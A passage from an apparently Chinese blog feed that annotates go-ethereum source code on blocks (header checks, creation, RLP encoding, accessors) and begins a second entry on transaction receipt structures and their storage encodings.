class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射类型用于获取运行时信息，这里获取 header 的内存的字节数，和动态类型相关</span></span><br><span class="line"><span class="keyword">var</span> headerSize = common.StorageSize(reflect.TypeOf(Header&#123;&#125;).Size())</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取区块头占用的内存大小，用于估计占用内存和限制内存消耗</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Size returns the approximate memory used by all internal contents. It is used</span></span><br><span class="line"><span class="comment">// to approximate and limit the memory consumption of various caches.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Header)</span></span> Size() common.StorageSize &#123;</span><br><span class="line">   <span class="keyword">return</span> headerSize + common.StorageSize(<span class="built_in">len</span>(h.Extra)+(h.Difficulty.BitLen()+h.Number.BitLen())/<span class="number">8</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查字段是否合理以及动态类型所占用的内存是否合理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// SanityCheck checks a few basic things -- these checks are way beyond what</span></span><br><span class="line"><span class="comment">// any &#x27;sane&#x27; production values should hold, and can mainly be used to prevent</span></span><br><span class="line"><span class="comment">// that the unbounded fields are stuffed with junk data to add processing</span></span><br><span class="line"><span class="comment">// overhead</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Header)</span></span> SanityCheck() <span class="type">error</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> h.Number != <span class="literal">nil</span> &amp;&amp; !h.Number.IsUint64() &#123;</span><br><span class="line">      <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;too large block number: bitlen %d&quot;</span>, h.Number.BitLen())</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> h.Difficulty != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> diffLen := h.Difficulty.BitLen(); diffLen &gt; <span class="number">80</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;too large block difficulty: bitlen %d&quot;</span>, diffLen)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> eLen := <span class="built_in">len</span>(h.Extra); eLen &gt; <span class="number">100</span>*<span class="number">1024</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;too large block extradata: size %d&quot;</span>, eLen)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> h.BaseFee != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> bfLen := h.BaseFee.BitLen(); bfLen &gt; <span class="number">256</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;too large base fee: bitlen %d&quot;</span>, bfLen)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建区块">创建区块</h3><p>创建区块需要知道 区块头、交易列表、叔块列表、收据列表，并且传入了一个哈希器。生成区块的过程其实最主要是赋值的过程</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewBlock creates a new block. The input data is copied,</span></span><br><span class="line"><span class="comment">// changes to header and to the field values will not affect the</span></span><br><span class="line"><span class="comment">// block.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The values of TxHash, UncleHash, ReceiptHash and Bloom in header</span></span><br><span class="line"><span class="comment">// are ignored and set to values derived from the given txs, uncles</span></span><br><span class="line"><span class="comment">// and receipts.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlock</span><span class="params">(header *Header, txs []*Transaction, uncles []*Header, receipts []*Receipt, hasher TrieHasher)</span></span> *Block &#123;</span><br><span class="line">   b := &amp;Block&#123;header: CopyHeader(header), td: <span class="built_in">new</span>(big.Int)&#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// <span class="doctag">TODO:</span> panic if len(txs) != len(receipts)</span></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(txs) == <span class="number">0</span> &#123;</span><br><span class="line">      b.header.TxHash = EmptyRootHash</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      b.header.TxHash = DeriveSha(Transactions(txs), hasher) <span class="comment">//生成交易树的根哈希</span></span><br><span class="line">      b.transactions = <span class="built_in">make</span>(Transactions, <span class="built_in">len</span>(txs))</span><br><span class="line">      <span class="built_in">copy</span>(b.transactions, txs) <span class="comment">//复制交易到区块</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(receipts) == <span class="number">0</span> &#123;</span><br><span class="line">      b.header.ReceiptHash = EmptyRootHash</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      b.header.ReceiptHash = DeriveSha(Receipts(receipts), hasher) <span class="comment">//生成收据树根哈希</span></span><br><span class="line">      b.header.Bloom = CreateBloom(receipts)                       <span class="comment">//根据收据创建布隆过滤器</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(uncles) == <span class="number">0</span> &#123;</span><br><span class="line">      b.header.UncleHash = EmptyUncleHash</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      b.header.UncleHash = CalcUncleHash(uncles) <span class="comment">//生成叔块哈希</span></span><br><span class="line">      b.uncles = <span class="built_in">make</span>([]*Header, <span class="built_in">len</span>(uncles))</span><br><span class="line">      <span class="keyword">for</span> i := <span class="keyword">range</span> uncles &#123;</span><br><span class="line">         b.uncles[i] = CopyHeader(uncles[i])</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewBlockWithHeader creates a block with the given header data. The</span></span><br><span class="line"><span class="comment">// header data is copied, changes to header and to the field values</span></span><br><span class="line"><span class="comment">// will not affect the block.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlockWithHeader</span><span class="params">(header *Header)</span></span> *Block &#123;</span><br><span class="line">   <span class="keyword">return</span> &amp;Block&#123;header: CopyHeader(header)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="区块的编码">区块的编码</h3><p>存储时，按照 MPT 树的需求，也需要进行 RLP 编码，暂时不必深入，后续可能单独作解读。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DecodeRLP decodes the Ethereum</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> DecodeRLP(s *rlp.Stream) <span class="type">error</span> &#123;</span><br><span class="line">   <span class="keyword">var</span> eb extblock</span><br><span class="line">   _, size, _ := s.Kind()</span><br><span class="line">   <span class="keyword">if</span> err := s.Decode(&amp;eb); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">   &#125;</span><br><span class="line">   b.header, b.uncles, b.transactions = eb.Header, eb.Uncles, eb.Txs</span><br><span class="line">   b.size.Store(common.StorageSize(rlp.ListSize(size)))</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EncodeRLP serializes b into the Ethereum RLP block format.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> EncodeRLP(w io.Writer) <span class="type">error</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> rlp.Encode(w, extblock&#123;</span><br><span class="line">      Header: b.header,</span><br><span class="line">      Txs:    b.transactions,</span><br><span class="line">      Uncles: b.uncles,</span><br><span class="line">   &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取区块属性">获取区块属性</h3><p>为了方便快速获取区块属性，设置了许多的方法，通过名字都能直观地了解含义。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Uncles() []*Header          &#123; <span class="keyword">return</span> b.uncles &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Transactions() Transactions &#123; <span class="keyword">return</span> b.transactions &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Number() *big.Int     &#123; <span class="keyword">return</span> <span class="built_in">new</span>(big.Int).Set(b.header.Number) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> GasLimit() <span class="type">uint64</span>     &#123; <span class="keyword">return</span> b.header.GasLimit &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> GasUsed() <span class="type">uint64</span>      &#123; <span class="keyword">return</span> b.header.GasUsed &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Difficulty() *big.Int &#123; <span class="keyword">return</span> <span class="built_in">new</span>(big.Int).Set(b.header.Difficulty) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Time() <span class="type">uint64</span>         &#123; <span class="keyword">return</span> b.header.Time &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> NumberU64() <span class="type">uint64</span>        &#123; <span class="keyword">return</span> b.header.Number.Uint64() &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> MixDigest() common.Hash   &#123; <span class="keyword">return</span> b.header.MixDigest &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Nonce() <span class="type">uint64</span>            &#123; <span class="keyword">return</span> binary.BigEndian.Uint64(b.header.Nonce[:]) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Bloom() Bloom             &#123; <span class="keyword">return</span> b.header.Bloom &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Coinbase() common.Address &#123; <span class="keyword">return</span> b.header.Coinbase &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Root() common.Hash        &#123; <span class="keyword">return</span> b.header.Root &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> ParentHash() common.Hash  &#123; <span class="keyword">return</span> b.header.ParentHash &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> TxHash() common.Hash      &#123; <span class="keyword">return</span> b.header.TxHash &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> ReceiptHash() common.Hash &#123; <span class="keyword">return</span> b.header.ReceiptHash &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> UncleHash() common.Hash   &#123; <span class="keyword">return</span> b.header.UncleHash &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Extra() []<span class="type">byte</span>            &#123; <span class="keyword">return</span> common.CopyBytes(b.header.Extra) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> BaseFee() *big.Int &#123;</span><br><span class="line">   <span class="keyword">if</span> b.header.BaseFee == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">new</span>(big.Int).Set(b.header.BaseFee)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里一般都是复制</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Header() *Header &#123; <span class="keyword">return</span> CopyHeader(b.header) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Body returns the non-header content of the block.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Body() *Body &#123; <span class="keyword">return</span> &amp;Body&#123;b.transactions, b.uncles&#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Size returns the true RLP encoded storage size of the block, either by encoding</span></span><br><span class="line"><span class="comment">// and returning it, or returning a previsouly cached value.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Size() common.StorageSize &#123;</span><br><span class="line">   <span class="keyword">if</span> size := b.size.Load(); size != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> size.(common.StorageSize)</span><br><span class="line">   &#125;</span><br><span class="line">   c := writeCounter(<span class="number">0</span>)</span><br><span class="line">   rlp.Encode(&amp;c, b)</span><br><span class="line">   b.size.Store(common.StorageSize(c))</span><br><span class="line">   <span class="keyword">return</span> common.StorageSize(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="检索交易">检索交易</h3><p>交易一旦生成，不管是否被打包上链，都会生成交易哈希，用于检索。成块后可以方便的找到对应的区块高度，然后通过哈希值搜索交易。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据哈希搜索交易</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> Transaction(hash common.Hash) *Transaction &#123;</span><br><span class="line">   <span class="keyword">for</span> _, transaction := <span class="keyword">range</span> b.transactions &#123;</span><br><span class="line">      <span class="keyword">if</span> transaction.Hash() == hash &#123;</span><br><span class="line">         <span class="keyword">return</span> transaction</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="区块的赋值和替换">区块的赋值和替换</h3><p>提供了替换区块头或者替换区块体的两种方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//seal 相当于铅封，类比区块头。生成用传入的区块头替代，主体不变的区块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// WithSeal returns a new block with the data from b but the header replaced with</span></span><br><span class="line"><span class="comment">// the sealed one.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> WithSeal(header *Header) *Block &#123;</span><br><span class="line">   cpy := *header</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> &amp;Block&#123;</span><br><span class="line">      header:       &amp;cpy,</span><br><span class="line">      transactions: b.transactions,</span><br><span class="line">      uncles:       b.uncles,</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//替代区块主体，生成新的区块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// WithBody returns a new block with the given transaction and uncle contents.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> WithBody(transactions []*Transaction, uncles []*Header) *Block &#123;</span><br><span class="line">   block := &amp;Block&#123;</span><br><span class="line">      header:       CopyHeader(b.header),</span><br><span class="line">      transactions: <span class="built_in">make</span>([]*Transaction, <span class="built_in">len</span>(transactions)),</span><br><span class="line">      uncles:       <span class="built_in">make</span>([]*Header, <span class="built_in">len</span>(uncles)),</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">copy</span>(block.transactions, transactions)</span><br><span class="line">   <span class="keyword">for</span> i := <span class="keyword">range</span> uncles &#123;</span><br><span class="line">      block.uncles[i] = CopyHeader(uncles[i])</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.codeleading.com/article/3301657376/">https://www.codeleading.com/article/3301657376/</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>理解收据receipt</title>
    <link href="https://www.blog-blockchain.xyz/geth/understand-receipt/"/>
    <id>https://www.blog-blockchain.xyz/geth/understand-receipt/</id>
    <published>2022-08-24T21:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.924Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><h2 id="核心结构">核心结构</h2><p>收据主要包括交易类型、交易是否成功的状态码、交易是否成功的编码、直到这笔交易区块消耗的 gas、和布隆过滤器。为了方便处理交易，也添加了交易的信息，包括交易哈希、合约地址和消耗的 gas。为了检查交易和收据是否匹配，提供了区块哈希、区块高度和交易在区块中的索引。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Receipt represents the results of a transaction.</span></span><br><span class="line"><span class="keyword">type</span> Receipt <span class="keyword">struct</span> &#123;</span><br><span class="line">   <span class="comment">// Consensus fields: These fields are defined by the Yellow Paper</span></span><br><span class="line">   Type      <span class="type">uint8</span>  <span class="string">`json:&quot;type,omitempty&quot;`</span> <span class="comment">//交易类型</span></span><br><span class="line">   PostState []<span class="type">byte</span> <span class="string">`json:&quot;root&quot;`</span>           <span class="comment">//交易成功/失败时的 RLP 编码</span></span><br><span class="line">   Status    <span class="type">uint64</span> <span class="string">`json:&quot;status&quot;`</span>         <span class="comment">//交易成功/失败的状态码</span></span><br><span class="line">   <span class="comment">//区块中直到这一笔交易累积使用的 gas</span></span><br><span class="line">   CumulativeGasUsed <span class="type">uint64</span> <span class="string">`json:&quot;cumulativeGasUsed&quot; gencodec:&quot;required&quot;`</span></span><br><span class="line">   <span class="comment">//布隆过滤q</span></span><br><span class="line">   Bloom Bloom <span class="string">`json:&quot;logsBloom&quot;         gencodec:&quot;required&quot;`</span></span><br><span class="line">   <span class="comment">//合约的日志列表</span></span><br><span class="line">   Logs []*Log <span class="string">`json:&quot;logs&quot;              gencodec:&quot;required&quot;`</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//处理交易时的字段</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Implementation fields: These fields are added by geth when processing a transaction.</span></span><br><span class="line">   <span class="comment">// They are stored in the chain database.</span></span><br><span class="line">   TxHash          common.Hash    <span class="string">`json:&quot;transactionHash&quot; gencodec:&quot;required&quot;`</span></span><br><span class="line">   ContractAddress common.Address <span class="string">`json:&quot;contractAddress&quot;`</span></span><br><span class="line">   GasUsed         <span class="type">uint64</span>         <span class="string">`json:&quot;gasUsed&quot; gencodec:&quot;required&quot;`</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//记录区块信息和交易索引，用于叫检查交易与对应收据的兼容性</span></span><br><span class="line">   <span class="comment">// Inclusion information: These fields provide information about the inclusion of the</span></span><br><span class="line">   <span class="comment">// transaction corresponding to this receipt.</span></span><br><span class="line">   BlockHash        common.Hash <span class="string">`json:&quot;blockHash,omitempty&quot;`</span></span><br><span class="line">   BlockNumber      *big.Int    <span class="string">`json:&quot;blockNumber,omitempty&quot;`</span></span><br><span class="line">   TransactionIndex <span class="type">uint</span>        <span class="string">`json:&quot;transactionIndex&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>收据的部分字段需要编码后永久存储，因此提供了编码时的中间结构和永久存储的结构</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//收据 RLP 编码时的中间结构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// receiptRLP is the consensus encoding of a receipt.</span></span><br><span class="line"><span class="keyword">type</span> receiptRLP <span class="keyword">struct</span> &#123;</span><br><span class="line">PostStateOrStatus []<span class="type">byte</span></span><br><span class="line">CumulativeGasUsed <span class="type">uint64</span></span><br><span class="line">Bloom             Bloom</span><br><span class="line">Logs              []*Log</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将会永久存储的部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// storedReceiptRLP is the storage encoding of a receipt.</span></span><br><span class="line"><span class="keyword">type</span> storedReceiptRLP <span class="keyword">struct</span> &#123;</span><br><span class="line">PostStateOrStatus []<span class="type">byte</span></span><br><span class="line">CumulativeGasUsed <span class="type">uint64</span></span><br><span class="line">Logs              []*LogForStorage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了写入数据库时分析收据的内容，为了避免层层嵌套，就直接设置了如下的结构。可见以太坊采用的数据库其实也是不断升级的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//封装收据，避免嵌套封装，用于分析收据的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// v4StoredReceiptRLP is the storage encoding of a receipt used in database version 4.</span></span><br><span class="line"><span class="keyword">type</span> v4StoredReceiptRLP <span class="keyword">struct</span> &#123;</span><br><span class="line">PostStateOrStatus []<span class="type">byte</span></span><br><span class="line">CumulativeGasUsed <span class="type">uint64</span></span><br><span class="line">TxHash            common.Hash</span><br><span class="line">ContractAddress   common.Address</span><br><span class="line">Logs              []*LogForStorage</span><br><span class="line">GasUsed           <span class="type">uint64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// v3StoredReceiptRLP is the original storage encoding of a receipt including some unnecessary fields.</span></span><br><span class="line"><span class="keyword">type</span> v3StoredReceiptRLP <span class="keyword">struct</span> &#123;</span><br><span class="line">PostStateOrStatus []<span class="type">byte</span></span><br><span class="line">CumulativeGasUsed <span class="type">uint64</span></span><br><span class="line">Bloom             Bloom</span><br><span class="line">TxHash            common.Hash</span><br><span class="line">ContractAddress   common.Address</span><br><span class="line">Logs              []*LogForStorage</span><br><span class="line">GasUsed           <span class="type">uint64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="状态标记">状态标记</h2><p>首先设置了收据成功/失败时的 RLP 默认编码，以及交易是否成功的状态码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   